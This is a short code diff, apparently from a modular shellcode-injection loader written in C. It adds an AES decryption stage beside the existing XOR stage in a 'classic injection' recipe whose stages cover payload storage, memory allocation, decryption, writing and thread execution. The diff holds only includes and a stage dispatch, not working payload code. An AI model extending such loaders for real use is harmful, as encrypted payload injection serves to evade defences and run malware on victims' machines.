@@ -4,6 +4,7 @@
 #include "1_storage/storage_data.h"
 #include "2_allocation/alloc_local.h"
 #include "3_transformation/crypto_xor.h"
+#include "3_transformation/crypto_aes.h"
 #include "4_writing/write_local.h"
 #include "5_execution/exec_thread.h"
 // #include "5_execution/exec_apc.h" // Ví dụ mở rộng
@@ -24,6 +25,8 @@ void Recipe_Classic_Injection() {
     // Stage 3: Transformation (Decrypt)
     #ifdef ENCRYPTION_XOR
         Stage3_Transform_XOR(&ctx);
+    #elif defined(ENCRYPTION_AES)
+        Stage3_Transform_AES(&ctx);
     #endif
 
     // Stage 4: Writing
